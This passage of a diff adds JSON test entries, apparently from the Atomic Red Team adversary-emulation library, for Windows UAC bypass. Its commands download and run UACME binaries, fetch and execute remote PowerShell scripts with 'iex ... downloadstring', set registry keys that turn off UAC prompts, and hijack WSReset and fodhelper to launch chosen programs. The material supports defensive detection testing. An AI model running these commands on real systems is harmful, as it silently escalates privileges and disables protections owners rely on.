+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UACME Bypass Method 61",
+                        "auto_generated_guid": "7825b576-744c-4555-856d-caf3460dc236",
+                        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "uacme_exe": {
+                                "description": "Path to uacme executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+                                "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{uacme_exe}\"\n",
+                            "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - UAC Magic",
+                        "auto_generated_guid": "964d8bf8-37bc-4fd3-ba36-ad13761ebbcc",
+                        "description": "UAC bypass using Magic technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - UAC Bypass ccmstp technique",
+                        "auto_generated_guid": "f3c145f9-3c8d-422c-bd99-296a17a8f567",
+                        "description": "UAC bypass using ccmstp technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - UAC Bypass DiskCleanup technique",
+                        "auto_generated_guid": "1ed67900-66cd-4b09-b546-2a0ef4431a0c",
+                        "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - UAC Bypass DccwBypassUAC technique",
+                        "auto_generated_guid": "2b61977b-ae2d-4ae4-89cb-5c36c89586be",
+                        "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key",
+                        "auto_generated_guid": "251c5936-569f-42f4-9ac2-87a173b9e9b8",
+                        "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force",
+                            "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "UAC Bypass with WSReset Registry Modification",
+                        "auto_generated_guid": "3b96673f-9c92-40f1-8a3e-ca060846f8d9",
+                        "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "commandpath": {
+                                "description": "Registry path",
+                                "type": "string",
+                                "default": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
+                            },
+                            "commandtorun": {
+                                "description": "Command to run",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
+                            "cleanup_command": "Remove-Item #{commandpath} -Recurse -Force\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Disable UAC - Switch to the secure desktop when prompting for elevation via registry key",
+                        "auto_generated_guid": "85f3a526-4cfa-4fe7-98c1-dea99be025c7",
+                        "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force",
+                            "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Disable UAC notification via registry keys",
+                        "auto_generated_guid": "160a7c77-b00e-4111-9e45-7c2a44eda3fd",
+                        "description": "This atomic regarding UACDisableNotify pertains to the notification behavior of UAC. UAC is a critical security feature in Windows that prevents unauthorized changes to the operating system. It prompts the user for permission or an administrator password before allowing actions that could affect the system's operation or change settings that affect other users. The BlotchyQuasar RAT defense evasion activities that the adversary to disable UAC notifications makes it easier for malware and malicious software to execute with elevated privileges. [Article](https://securityintelligence.com/x-force/x-force-hive0129-targeting-financial-institutions-latam-banking-trojan/)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 1 /f\n",
+                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 0 /f\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Disable ConsentPromptBehaviorAdmin via registry keys",
+                        "auto_generated_guid": "a768aaa2-2442-475c-8990-69cf33af0f4e",
+                        "description": "This atomic regarding setting ConsentPromptBehaviorAdmin to 0 configures the UAC so that it does not prompt for consent or credentials when actions requiring elevated privileges are performed by users in the administrators group. This means that any operation that would normally trigger a UAC prompt will proceed automatically without user interaction.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n",
+                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "UAC bypassed by Utilizing ProgIDs registry.",
+                        "auto_generated_guid": "b6f4645c-34ea-4c7c-98f2-d5a2747efb08",
+                        "description": "This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command\" /ve /d \"C:\\Windows\\System32\\calc.exe\" /f\n\nreg add \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /d \".pwn\" /f\n\necho Triggering fodhelper.exe for potential privilege escalation...\nstart fodhelper.exe\n",
+                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command\" /ve /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /f\n",
+                            "name": "command_prompt"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 15:51:48"
+}
